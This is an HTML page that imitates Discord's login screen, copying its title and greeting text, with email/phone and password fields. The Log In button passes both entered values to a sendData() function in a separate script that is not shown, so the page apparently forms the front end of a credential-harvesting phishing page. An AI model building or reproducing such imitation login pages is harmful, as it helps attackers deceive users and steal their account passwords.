<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Discord Login</title>
    <link rel="stylesheet" href=".\reset.css">
    <link rel="stylesheet" href=".\style.css">
    <link rel="icon" type="image/x-icon" href="/sources/ec2c34cadd4b5f4594415127380a85e6.ico">
</head>

<body>
    <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
    <script src=".\main.js"></script>
    <div class="login">
        <div class="form">
        <h1>Welcome back!</h1><br>
        <p class="nice">We're so excited to see you again!</p>
        <br>
        <form>
            <p class="info">EMAIL OR PHONE NUMBER <r>*</r> </p>
            <input id='Username' type='text' class="input">
            <br>
            <p class="info">PASSWORD <r>*</r></p>
            <!--<form>-->
            <input id='Password' type='password' class="input">
            <br>
        </form>
        <button class="loginButton" onclick="sendData(document.getElementById('Username').value, document.getElementById('Password').value)">Log
            In</button>
        </div>
    </div>
</body>

</html>
